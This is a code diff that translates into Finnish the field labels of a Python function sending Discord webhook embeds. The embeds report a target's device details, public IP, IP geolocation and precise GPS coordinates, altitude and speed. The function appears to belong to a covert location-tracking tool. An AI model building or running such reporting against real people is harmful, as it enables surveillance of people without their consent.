@@ -12,23 +12,23 @@ def discord_sender(url, msg_type, content):
             "content": None,
             "embeds": [
                 {
-                    "title": "Device Information",
+                    "title": "Laitteen tiedot",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "OS",
+                            "name": "Käyttöjärjestelmä",
                             "value": json_content['os']
                         },
                         {
-                            "name": "Platform",
+                            "name": "Alusta",
                             "value": json_content['platform']
                         },
                         {
-                            "name": "Browser",
+                            "name": "Selain",
                             "value": json_content['browser']
                         },
                         {
-                            "name": "GPU Vendor",
+                            "name": "GPU-valmistaja",
                             "value": json_content['vendor']
                         },
                         {
@@ -36,7 +36,7 @@ def discord_sender(url, msg_type, content):
                             "value": json_content['render']
                         },
                         {
-                            "name": "CPU Cores",
+                            "name": "CPU-ytimiä",
                             "value": json_content['cores']
                         },
                         {
@@ -44,11 +44,11 @@ def discord_sender(url, msg_type, content):
                             "value": json_content['ram']
                         },
                         {
-                            "name": "Public IP",
+                            "name": "Julkinen IP",
                             "value": json_content['ip']
                         },
                         {
-                            "name": "Resolution",
+                            "name": "Resoluutio",
                             "value": f'{json_content["ht"]}x{json_content["wd"]}'
                         }
                     ]
@@ -62,23 +62,23 @@ def discord_sender(url, msg_type, content):
             "content": None,
             "embeds": [
                 {
-                    "title": "IP Information",
+                    "title": "IP-tiedot",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "Continent",
+                            "name": "Manner",
                             "value": json_content['continent']
                         },
                         {
-                            "name": "Country",
+                            "name": "Maa",
                             "value": json_content['country']
                         },
                         {
-                            "name": "Region",
+                            "name": "Alue",
                             "value": json_content['region']
                         },
                         {
-                            "name": "City",
+                            "name": "Kaupunki",
                             "value": json_content['city']
                         },
                         {
@@ -100,31 +100,31 @@ def discord_sender(url, msg_type, content):
             "content": None,
             "embeds": [
                 {
-                    "title": "Location Information",
+                    "title": "Sijaintitiedot",
                     "color": 65280,
                     "fields": [
                         {
-                            "name": "Latitude",
+                            "name": "Leveysaste",
                             "value": json_content['lat']
                         },
                         {
-                            "name": "Longitude",
+                            "name": "Pituusaste",
                             "value": json_content['lon']
                         },
                         {
-                            "name": "Accuracy",
+                            "name": "Tarkkuus",
                             "value": json_content['acc']
                         },
                         {
-                            "name": "Altitude",
+                            "name": "Korkeus",
                             "value": json_content['alt']
                         },
                         {
-                            "name": "Direction",
+                            "name": "Suunta",
                             "value": json_content['dir']
                         },
                         {
-                            "name": "Speed",
+                            "name": "Nopeus",
                             "value": json_content['spd']
                         }
                     ]
@@ -149,7 +149,7 @@ def discord_sender(url, msg_type, content):
                     "color": 16711680,
                     "fields": [
                         {
-                            "name": "Error",
+                            "name": "Virhe",
                             "value": json_content['error']
                         }
                     ]
